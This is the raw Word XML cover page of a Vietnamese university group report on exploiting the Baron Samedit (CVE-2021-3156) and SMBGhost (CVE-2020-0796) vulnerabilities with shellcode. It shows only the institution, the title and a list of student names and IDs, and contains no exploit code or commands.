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8979"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C3420A" w:rsidRPr="00C81D12" w14:paraId="67C5B850" w14:textId="77777777" w:rsidTr="00C3420A">
        <w:trPr>
          <w:trHeight w:val="4396"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9092" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="7C078EA3" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:bookmarkStart w:id="0" w:name="_Toc87264852"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>B</w:t>
            </w:r>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>AN CƠ YẾU CHÍNH PHỦ</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48F80870" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
              </w:rPr>
              <w:t>HỌC VIỆN KỸ THUẬT MẬT MÃ</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E688907" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
              <w:t>¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B5DB14D" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="008372B2" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:sz w:val="12"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="1467B636" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:noProof/>
                <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46FEA4CE" wp14:editId="1CC0FB73">
                  <wp:extent cx="1325880" cy="1318752"/>
                  <wp:effectExtent l="0" t="0" r="7620" b="0"/>
                  <wp:docPr id="941861365" name="Picture 9418613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8815" cy="1321671"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                          <a:noFill/>
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="69C5E3EC" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="00C81D12" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C3420A" w:rsidRPr="00C81D12" w14:paraId="42E118AE" w14:textId="77777777" w:rsidTr="00C3420A">
        <w:trPr>
          <w:trHeight w:val="2594"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9092" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="273CBE43" w14:textId="4674A13E" w:rsidR="00C3420A" w:rsidRDefault="000B08BE" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="48"/>
                <w:szCs w:val="48"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="48"/>
                <w:szCs w:val="48"/>
              </w:rPr>
              <w:t>BÁO CÁO</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4515D3AB" w14:textId="568793A7" w:rsidR="000B08BE" w:rsidRPr="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>MÔN: KHAI THÁC LỖ HỔNG PHẦN MỀM</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="605BEB14" w14:textId="77777777" w:rsidR="00C3420A" w:rsidRPr="004F7948" w:rsidRDefault="00C3420A" w:rsidP="00AD3CAA">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="6653D480" w14:textId="4A5E3FC3" w:rsidR="000B08BE" w:rsidRPr="000B08BE" w:rsidRDefault="0082388F" w:rsidP="000B08BE">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>KHAI THÁC LỖ HỔNG</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A6A80EE" w14:textId="4330B493" w:rsidR="00C3420A" w:rsidRPr="00517338" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:lang w:val="en-AU" w:eastAsia="en-AU" w:bidi="th-TH"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>CVE-2021-3156 (B</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>ARON</w:t>
            </w:r>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t xml:space="preserve"> S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>AMEDIT</w:t>
            </w:r>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
            <w:r w:rsidR="0082388F">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t xml:space="preserve"> VÀ</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>CVE-2020-0796 (SMBG</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>HOST</w:t>
            </w:r>
            <w:r w:rsidRPr="000B08BE">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r w:rsidR="0082388F">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>
                <w:spacing w:val="-12"/>
                <w:sz w:val="32"/>
                <w:szCs w:val="32"/>
              </w:rPr>
              <w:t>SỬ DỤNG SHELLCODE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C3420A" w:rsidRPr="00C81D12" w14:paraId="6B7A1EDB" w14:textId="77777777" w:rsidTr="00C3420A">
        <w:trPr>
          <w:trHeight w:val="5748"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9092" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w14:paraId="2665ECC7" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="00C3420A" w:rsidP="000B08BE">
            <w:pPr>
              <w:pStyle w:val="TrangBa"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="1134"/>
                <w:tab w:val="left" w:pos="1701"/>
              </w:tabs>
              <w:spacing w:line="312" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00C81D12">
              <w:rPr>
                <w:rFonts w:cs="Times New Roman"/>
                <w:b/>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0"/>
              <w:gridCol w:w="3402"/>
              <w:gridCol w:w="1821"/>
            </w:tblGrid>
            <w:tr w:rsidR="000B08BE" w14:paraId="18942373" w14:textId="6243ED2E" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="70CD71D1" w14:textId="3279E166" w:rsidR="000B08BE" w:rsidRPr="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                      <w:i/>
                      <w:iCs/>
                    </w:rPr>
                  </w:pPr>
                  <w:r w:rsidRPr="000B08BE">
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                      <w:i/>
                      <w:iCs/>
                    </w:rPr>
                    <w:t>Nhóm sinh viên thực hiện:</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="14944E7F" w14:textId="1534E9DE" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Nhóm 9</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="62EEE988" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="702DCBEC" w14:textId="0281EEDC" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="0620A6EE" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="2DB0BC1F" w14:textId="58C03B38" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Nguyễn Minh Tài</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="4DB52957" w14:textId="1A878EEF" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT180143</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="1076D536" w14:textId="39FFCA05" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="27F514B2" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="0027C32A" w14:textId="692FC090" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Nguyễn Thùy Linh</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="24F60360" w14:textId="50408A65" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT180130</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="647F4612" w14:textId="0CEC4063" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="39DE3FE0" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="1E45529E" w14:textId="207D534B" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Đinh Tiến Hoàng</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="5E6EC684" w14:textId="6B7FE162" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT180120</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="29FDCB95" w14:textId="5AC2AAC4" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="01B0161B" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="5B4CBD0F" w14:textId="0EEA75D0" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Bùi Quang Bình</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="791E01DC" w14:textId="3F41D9FE" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT170505</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="5A51AC9F" w14:textId="0F3A3AE7" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="0877E986" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="7B467DB6" w14:textId="2F3211FD" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Trần Thị Ngọc Anh</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="47F26BA3" w14:textId="4E99B1F5" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>AT150503</w:t>
                  </w:r>
                </w:p>
              </w:tc>
            </w:tr>
            <w:tr w:rsidR="000B08BE" w14:paraId="203EF955" w14:textId="3A181D23" w:rsidTr="000B08BE">
              <w:trPr>
                <w:jc w:val="center"/>
              </w:trPr>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3530" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="1173607D" w14:textId="77777777" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="3402" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="1249473F" w14:textId="606980F6" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
                  <w:pPr>
                    <w:pStyle w:val="TrangBa"/>
                    <w:tabs>
                      <w:tab w:val="left" w:pos="1134"/>
                      <w:tab w:val="left" w:pos="1701"/>
                    </w:tabs>
                    <w:spacing w:line="312" w:lineRule="auto"/>
                    <w:jc w:val="left"/>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                  </w:pPr>
                  <w:r>
                    <w:rPr>
                      <w:rFonts w:cs="Times New Roman"/>
                    </w:rPr>
                    <w:t>Nguyễn Thị Huyền My</w:t>
                  </w:r>
                </w:p>
              </w:tc>
              <w:tc>
                <w:tcPr>
                  <w:tcW w:w="1821" w:type="dxa"/>
                </w:tcPr>
                <w:p w14:paraId="4A22A826" w14:textId="405A6701" w:rsidR="000B08BE" w:rsidRDefault="000B08BE" w:rsidP="000B08BE">
